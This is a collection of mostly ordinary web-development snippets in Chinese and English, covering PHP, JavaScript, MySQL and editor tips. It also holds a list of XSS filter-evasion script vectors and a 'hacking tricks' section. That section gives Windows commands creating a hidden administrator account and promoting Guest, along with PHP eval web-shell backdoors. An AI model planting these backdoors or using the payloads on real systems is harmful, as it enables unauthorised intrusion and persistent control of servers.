###[socket.io-php](https://github.com/rase-/socket.io-php-emitter)
```js
$redis = new \Redis(); // Using the Redis extension provided client
$redis->connect('127.0.0.1', '6379');
$emitter = new SocketIO\Emitter($redis);
$emitter->emit('event', 'payload str');
$emitter = new SocketIO\Emitter(array('port' => '6379', 'host' => '127.0.0.1'));
// broadcast can be replaced by any of the other flags
$emitter->broadcast->emit('other event', 'such data');
```
###[xss data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K](http://www.csdn.net/article/2013-02-01/2814041-1-line-browser-notepad)
```js
    data:text/html, <html contenteditable>  
data:text/html, <textarea style="font-size: 1.5em; width: 100%; height: 100%; border: none; outline: none" autofocus /> 
data:text/html,<html lang="en"><head><style> html,body { height: 100% } #note { width: 100%; height: 100% } </style> <script> var note, html, timeout; window.addEventListener('load', function() { note = document.getElementById('note'); html = document.getElementsByTagName('html')[0]; html.addEventListener('keyup', function(ev) { if (timeout) clearTimeout(timeout); timeout = setTimeout(saveNote, 100); }); restoreNote(); note.focus(); }); function saveNote() { localStorage.note = note.innerText; timeout = null; } function restoreNote() { note.innerText = localStorage.note || ''; } </script> </head><body><h1>Notepad (type below, notes persist)</h1> <p id="note" contenteditable=""></p> </body></html>

data:text/html, <style type="text/css">#e{position:absolute;top:0;right:0;bottom:0;left:0;}</style><div id="e"></div><script src="http://d1n0x3qji82z53.cloudfront.net/src-min-noconflict/ace.js" type="text/javascript" charset="utf-8"></script><script>var e=ace.edit("e");e.setTheme("ace/theme/monokai");e.getSession().setMode("ace/mode/ruby");</script> 

https://gist.github.com/minikomi/4672169

data:text/html, <body><canvas id="dyDraw">你的浏览器不支持HTML5 Canvas</canvas></body><script>function $(id){return document.getElementById(id);} $('dyDraw').width=document.body.clientWidth;$('dyDraw').height=document.body.clientHeight;if(window.addEventListener){window.addEventListener('load',function(){var canvas,canvastext;var hua=false;function dyDrawing(){canvas=$('dyDraw');canvastext=canvas.getContext('2d');canvas.addEventListener('mousedown',canvasMouse,false);canvas.addEventListener('mousemove',canvasMouse,false);window.addEventListener('mouseup',canvasMouse,false);} function canvasMouse(dy){var x,y;if(dy.layerX||dy.layerX==0){x=dy.layerX;y=dy.layerY;}else if(dy.offsetX||dy.offsetX==0){x=dy.offsetX;y=dy.offsetY;} x-=dyDraw.offsetLeft;y-=dyDraw.offsetTop;if(dy.type=='mousedown'){hua=false;canvastext.beginPath();canvastext.moveTo(x,y);hua=true;}else if(dy.type=='mousemove'){if(hua){canvastext.strokeStyle="rgb(255,0,0)";canvastext.lineWidth=9;canvastext.lineTo(x,y);canvastext.stroke();}}else if(dy.type=='mouseup'){hua=false;}} dyDrawing();},false);}</script>

支持各种编程语言的编辑器http://www.cnblogs.com/voidy/p/4276156.html

浏览器地址栏输入以下内容：

data:text/html, <style type="text/css">.e{position:absolute;top:0;right:0;bottom:0;left:0;}</style><div class="e" id="editor"></div><script src="http://d1n0x3qji82z53.cloudfront.net/src-min-noconflict/ace.js" type="text/javascript" charset="utf-8"></script><script>var e=ace.edit("editor");e.setTheme("ace/theme/monokai");e.getSession().setMode("ace/mode/ruby");</script>

更多语言的支持: 将 ace/mode/ruby用以下语言替换：

Markdown -> ace/mode/markdown

Python -> ace/mode/python

C/C++ -> ace/mode/c_cpp

Javscript -> ace/mode/javascript

Java -> ace/mode/java

Scala- -> ace/mode/scala

CoffeeScript -> ace/mode/coffee

and css, html, php, latex, tex, sh, sql, lua, clojure, dart, typescript, go, groovy, json, jsp, less, lisp, lucene, perl, powershell, scss, textile, xml, yaml, xquery, liquid, diff and many more...
想换个主题

将 ace/theme/monokai用下面的替换掉：

Eclipse -> ace/theme/eclipse

GitHub -> ace/theme/github

TextMate -> ace/theme/textmate

and ambiance, dawn, chaos, chrome, dreamweaver, xcode, vibrant_ink, solarized_dark, solarized_light, tomorrow, tomorrow_night, tomorrow_night_blue, twilight, tomorrow_night_eighties, pastel_on_dark and many more..

##想在浏览器编辑Markdown

data:text/html,<style type="text/css">.e{position:absolute;top:0;right:50%;bottom:0;left:0;} .c{position:absolute;overflow:auto;top:0;right:0;bottom:0;left:50%;}</style><div class="e" id="editor"></div><div class="c"></div><script src="http://d1n0x3qji82z53.cloudfront.net/src-min-noconflict/ace.js" type="text/javascript" charset="utf-8"></script><script src="http://cdnjs.cloudflare.com/ajax/libs/showdown/0.3.1/showdown.min.js"></script><script> function showResult(e){consoleEl.innerHTML=e}var e=ace.edit("editor");e.setTheme("ace/theme/monokai");e.getSession().setMode("ace/mode/markdown");var consoleEl=document.getElementsByClassName("c")[0];var converter=new Showdown.converter;e.commands.addCommand({name:"markdown",bindKey:{win:"Ctrl-M",mac:"Command-M"},exec:function(t){var n=e.getSession().getMode().$id;if(n=="ace/mode/markdown"){showResult(converter.makeHtml(t.getValue()))}},readOnly:true})</script>
```
###[XSS vectors](https://gist.github.com/JohannesHoppe/5612274)
```js

<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
```
###[javascript 实现html页面的关键字搜索](https://segmentfault.com/q/1010000008155078)
```js
document.getElementsByClassName('markdown-body')[0].innerHTML=html.replace(searchKey, '<span class=\'highlight\'>' + searchKey + '</span>')
<div data-v-4fced2a0="" class="markdown-body">
  <section data-v-4fced2a0=""><h1 id="Hello">Hello</h1>
    <h2>hello1</h2>
    <h2>hello2</h2>
    <p><code>&lt;span&gt;<span>{{</span>sss<span>}}</span>&lt;/span&gt;</code></p>
    <blockquote><p>This is test.</p></blockquote>
    <ul>
      <li>How are you?</li>
      <li>Fine, Thank you, and you?</li>
      <li>I'm fine， too. Thank you.</li>
      <li>
        🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃🌚🙃🙃
      </li>
    </ul>
    <h1 id="最新消息">最新消息</h1>
  </section>
</div>
 (function () {

    var searchKey = 'F'
    var html = document.getElementsByClassName('markdown-body')[0].innerHTML
   document.getElementsByClassName('markdown-body')[0].innerHTML=html.replace(searchKey, '<span class=\'highlight\'>' + searchKey + '</span>')

  }())
```
###[json转换](https://segmentfault.com/q/1010000008155612)
```js
let arr = [{
    "id": "1",
    "parentId": "0",
    "nodeName": "公告资讯",
}, {
    "id": "2",
    "parentId": "1",
    "nodeName": "查看公告",
}, {
    "id": "4",
    "parentId": "0",
    "nodeName": "公告资讯",
}, {
    "id": "5",
    "parentId": "4",
    "nodeName": "查看公告",
}, {
    "id": "6",
    "parentId": "4",
    "nodeName": "查看公告1",
}];
let result = arr.reduce(function(prev, item) {
    prev[item.parentId] ? prev[item.parentId].push(item) : prev[item.parentId] = [item];
    return prev;
}, {});
for (let prop in result) {
    result[prop].forEach(function(item, i) {
        result[item.id] ? item.children = result[item.id] : ''
    });
}
result = result[0];
console.log(JSON.stringify(result))
[{"id":"1","parentId":"0","nodeName":"公告资讯","children":[{"id":"2","parentId":"1","nodeName":"查看公告"}]},{"id":"4","parentId":"0","nodeName":"公告资讯","children":[{"id":"5","parentId":"4","nodeName":"查看公告"},{"id":"6","parentId":"4","nodeName":"查看公告1"}]}]
```
###[js 获取当天凌晨的时间戳](https://segmentfault.com/q/1010000008160697)
```js
var timeStamp = new Date(new Date().setHours(0, 0, 0, 0)) / 1000;
//一天是86400秒   故n天前的时间戳为
var ThreeDayAgo = timeStamp - 86400 * n;
console.log(ThreeDayAgo)
```
###[xmlToString](https://segmentfault.com/q/1010000008161339)
```js
function xmlToString(xmlData) { 

    var xmlString;
    //IE
    if (window.ActiveXObject){
        xmlString = xmlData.xml;
    }
    // code for Mozilla, Firefox, Opera, etc.
    else{
        xmlString = (new XMLSerializer()).serializeToString(xmlData);
    }
    return xmlString;
}
```
###[Sublime Text 奇技淫巧](https://wowphp.com/post/qzpnewo2gxj8.html)
```js
用标签包裹行或选中项 Win：ALT + SHIFT + W     Mac：CTRL + ⇧ + W
计算数学表达式 Win：CTRL + SHIFT + Y     Mac：⌘ + ⇧ + Y
上移或下移行 Win：CTRL + SHIFT + ↑ 或 ↓     Mac：⌘ + CTRL + ⇧ 或 ⇩
```
###[Windows下搭建开发环境](https://wowphp.com/post/x69ndryep302.html)
```js
// 连接你的本地MySQL数据库 记得把 _CLh*#0Vlnwt 改为你自己的密码
$mysqli = new mysqli('127.0.0.1', 'root', '_CLh*#0Vlnwt');
// 连接失败
if ($mysqli->connect_error) {
    die('Connect Error (' . $mysqli->connect_errno . ') '
            . $mysqli->connect_error);
}
// 连接成功https://wowphp.com/catalog.html
echo 'Connection OK';
// 关闭MySQL连接
$mysqli->close();
```
###[PHP 数组去重](https://wowphp.com/post/o1xkd7l6dvj3.html)
```js
$array = array('green','blue','orange','blue');
$array = array_flip($array);
$array = array_flip($array);
 
/* 使用array_merge()函数修复键值*/
$array = array_merge($array);
$array = array('green','blue','orange','blue');
$array = array_flip($array);
/* 跟第一个例子一样，但是现在我们先提取数组的键值 */
$array = array_keys($array);
```
###["replace into" 的坑](https://wowphp.com/post/k08pekpxd9q7.html)
```js
在执行 REPLACE INTO auto (k) VALUES (1) 时首先尝试 INSERT INTO auto (k) VALUES (1)，但由于已经存在一条 k=1 的记录，发生了 duplicate key error，于是 MySQL 会先删除已有的那条 k=1 即 id=1 的记录，然后重新写入一条新的记录。
满足这一需求的 MySQL 方言是:

INSERT INTO auto (k, v) VALUES (1, ‘1-1’) ON DUPLICATE KEY UPDATE v=VALUES(v);

鉴于此，很多使用 REPLACE INTO 的场景，实际上需要的是 INSERT INTO … ON DUPLICATE KEY UPDATE，在正确理解 REPLACE INTO 行为和副作用的前提下，谨慎使用 REPLACE INTO
```
###[Hack神器及奇技淫巧](http://blog.yfgeek.com/2016/09/11/hacktool/)
```js
http://www.findmima.com/

http://www.wghostk.com/so/

http://p.08lt.com
http://whois.domaintools.com/
http://www.144118.com/
Windows新建用户

net user admin$ admin /add

net localgroup administrators admin$ /add

net user Guest 1234

net user Guest /active:yes

net localgroup administrators Guest /add
<?php eval($_POST[g]);?>
<?php substr(md5($_REQUEST['heroes']),28)=='acd0'&&eval($_REQUEST['c']);?>

```
###[php农历 ](http://blog.leanote.com/post/sinux/8ca27e3f616c)
```js


```
###[循环加速](http://www.phppan.com/2011/01/craft-1-cycle/)
```js
$data = range(0, 1000000);
 
$start = xdebug_time_index();
 
$len = count($data);	//	其实局部变量是很快的。
for($i = 0; $i < $len; $i++) {
}
$end = xdebug_time_index();
 
echo $end - $start;
$data = range(0, 1000000);
 将计数变量从大到小递减，当为0时自动停止。从而将判断语句和计数加1两条语句变成了一条语句。
$start = xdebug_time_index();
 
for($i = count($data); $i--;) {	//	我是关注点所在行
}
$end = xdebug_time_index();
 
echo $end - $start;
```
